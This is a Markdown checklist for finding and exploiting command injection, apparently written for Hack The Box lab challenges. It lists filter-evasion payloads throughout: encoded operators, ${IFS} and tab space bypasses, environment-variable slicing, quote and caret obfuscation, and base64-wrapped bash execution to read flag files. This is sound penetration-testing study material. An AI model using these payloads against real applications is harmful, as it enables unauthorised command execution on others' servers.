# Command Injection Checklist

**Rule:** Enumerate the filter before bypassing it. Test each layer independently.

## Phase 1 — Find the Injection Point
- [ ] Read the app — curl the page, identify all inputs that likely feed OS commands
- [ ] Note the input context: GET param, POST body, cookie, header
- [ ] Test each input with a single operator (`%0a` first) — does output change?
- [ ] Check DevTools Network tab — no request on error = front-end validation only → bypass with curl/Burp

## Phase 2 — Enumerate the Filter (Do This Before Bypassing)
- [ ] Test each operator **alone** (no command after it):
  - [ ] `%3b` (`;`) → Invalid? Blacklisted
  - [ ] `%0a` (`\n`) → Invalid? Blacklisted (usually NOT — use this)
  - [ ] `%26` (`&`) → Invalid? Blacklisted
  - [ ] `%7c` (`|`) → Invalid? Blacklisted
- [ ] Add **space only** after confirmed operator → Invalid? Space is blacklisted
- [ ] Add **command only** after confirmed operator → Invalid? Command is blacklisted
- [ ] Note: character filter and command filter are TWO independent layers

## Phase 3 — Operator Bypass
- [ ] `%0a` (newline) — try first
- [ ] `%26` (`&`) — try immediately if `%0a` is blocked; bypasses filters that block newline
- [ ] `%3b` (`;`) — try next
- [ ] `%7c` (`|`) — try next
- [ ] **Never stop at one operator** — test all of them on the confirmed injection point

## Phase 4 — Space Bypass
- [ ] `%09` (tab) — Linux + Windows
- [ ] `${IFS}` — Linux only (use single quotes in curl to prevent local expansion)
- [ ] `{cmd,-arg}` — brace expansion, Linux only

## Phase 5 — Character Bypass (slash, semicolon)
- [ ] Slash: `${PATH:0:1}` (PATH starts with `/`)
- [ ] Slash: `${HOME:0:1}` or `${PWD:0:1}`
- [ ] Semicolon: `${LS_COLORS:10:1}`
- [ ] Windows slash: `%HOMEPATH:~6,-11%` (CMD) or `$env:HOMEPATH[0]` (PowerShell)

## Phase 6 — Command Obfuscation
- [ ] Quote insertion: `w'h'o'am'i` or `w"h"o"am"i` — Linux + Windows
- [ ] `$@` empty expansion: `ca$@t` — Linux only
- [ ] Backslash: `w\ho\am\i` — Linux only
- [ ] Windows caret: `who^ami`
- [ ] Case manipulation: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` — replace spaces with `%09`
- [ ] Reverse: `$(rev<<<'imaohw')` — reverse the command name
- [ ] **Base64 (nuclear option):** encode entire command, use `bash<<<$(base64${IFS}-d<<<BASE64)`

## Phase 7 — Read the Flag
- [ ] Once execution confirmed: `cat${IFS}${PATH:0:1}flag.txt`
- [ ] Or base64 encode: `echo 'cat /flag.txt' | base64` → send with `%09` space bypass
- [ ] Find flag if path unknown: encode `find / -name "flag*" 2>/dev/null`
- [ ] **Use diff to find output** — do NOT just grep for `HTB{...}`:
  ```bash
  curl ... > /tmp/base.html
  curl ...<payload>... > /tmp/inj.html
  diff /tmp/base.html /tmp/inj.html
  ```

## Phase 8 — Operation Requirements Check
- [ ] Does the injection point only fire when ALL operation parameters are present?
- [ ] For move/copy operations: confirm `from=VALID_FILE`, `finish=1`, `move=1` are all included
- [ ] Verify the source file (`from=`) still exists — check file listing before each request
- [ ] Track which files have been moved/copied during testing

## Pitfall Reminders
- [ ] Use single quotes for curl `-d` arg — prevents local `${IFS}` expansion
- [ ] **Test `%26` if `%0a` is blocked** — do not give up on operator enumeration after newline fails
- [ ] Two filter layers exist independently — a passing operator can still fail if command is blacklisted
- [ ] Base64 payload: use `%09` not `${IFS}` for space (IFS may be filtered); use `echo` not `echo -n` (trailing newline helps)
- [ ] Base64 payload: use `<<<` not `|` (pipe is often filtered)
- [ ] Do not assume `HTB{...}` flag format — use diff against baseline to find output location
